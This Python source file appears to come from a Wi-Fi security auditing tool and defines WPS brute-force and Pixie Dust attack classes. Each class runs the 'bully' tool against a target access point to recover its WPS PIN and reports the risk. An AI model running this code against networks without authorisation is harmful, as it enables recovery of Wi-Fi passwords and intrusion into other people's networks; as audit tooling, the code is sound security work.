import sys
from Model.Attacks.AbstractAttack import AbstractAttack, AttackResultInfo
import subprocess as sb
import Model.utils as utl

class WPSBruteForceAttack(AbstractAttack):
    TIMEOUT = 50 #infinite

    @classmethod
    def attack_name(cls) -> str:
        return 'WPS Brute Force'

    @classmethod
    def description(cls, result: bool) -> str:
        desc = ""
        if result:
            desc += "PIN have been recovered, your password can also be recovered with the PIN found. "
        else:
            desc += "PIN could not be recovered, AP has some kind of protection against brute force. However, " \
            + "PIN could still be recovered by reducing the amount of tries per minute, WPS should be disabled"
        return desc

    @classmethod
    def execute_attack(cls, q, kwargs):
        '''
        Attempts to get the password via WPS pixie dust with bully tool.
        '''
        cmd = ['bully',
            kwargs['interface'].monitor,
            '-b', kwargs['target'].bssid,
            '--channel', str(kwargs['target'].channel), 
            '-v', '4'] #verbose lvl 2

        result = AttackResultInfo(attack=cls.attack_name())
    
        p = sb.Popen(["stdbuf","-i0","-o0","-e0"]  + cmd, stdout=sb.PIPE, text = True)
        
        with open(utl.pids_file, "a") as f:
            f.write(str(p.pid))

        lockout_reported = False
        for line in p.stdout:

            if lockout_reported or line.find("WPS pin not found") != -1: 
                q.put(line)
                q.put('Aborting...')
                result.risk = 'None'
                result.desc = cls.description(False)
                q.put(result)
                p.kill()
                return 
            
            if line.find('[*] Pin is') != -1:
                q.put(line)
                result.risk = 'High'
                result.desc = cls.description(True)
                q.put(result)
                return
            else:
                q.put(line)
                lockout_reported = line.find("WPS lockout reported") != -1

  
class PixieDustAttack(AbstractAttack):
    TIMEOUT = 50 #infinite

    @classmethod
    def attack_name(cls) -> str:
        return 'Pixie Dust'

    @classmethod
    def description(cls, result: bool) -> str:
        desc = ""
        if result:
            desc += "PIN have been recovered, your password can also be recovered with the PIN found. "
        else:
            desc += "PIN could not be recovered, AP has some kind of protection against brute force. However, " \
            + "PIN could still be recovered by reducing the amount of tries per minute, WPS should be disabled"
        return desc
        
    @classmethod
    def execute_attack(cls, q, kwargs):
        '''
        Attempts to get the password via WPS pixie dust with bully tool.
        '''
        cmd = ['bully',
            kwargs['interface'].monitor,
            '-b', kwargs['target'].bssid,
            '--channel', str(kwargs['target'].channel), 
            '-d', #pixie dust
            '-v', '2'] #verbose lvl 2

        result = AttackResultInfo(attack=cls.attack_name())
        
        p = sb.Popen(["stdbuf","-i0","-o0","-e0"]  + cmd, stdout=sb.PIPE, text = True)

        with open(utl.pids_file, "a") as f:
            f.write(str(p.pid))

        lockout_reported = False
        for line in p.stdout:

            if lockout_reported or line.find("WPS pin not found") != -1: 
                q.put(line)
                q.put('Aborting...')
                result.risk = 'None'
                result.desc = cls.description(False)
                q.put(result)
                p.kill()
                return 
            
            if line.find('[Pixie-Dust] PIN FOUND') != -1:
                q.put(line)
                result.risk = 'High'
                result.desc = cls.description(True)
                q.put(result)
                return
            else:
                q.put(line)
                lockout_reported = line.find("WPS lockout reported") != -1

  
   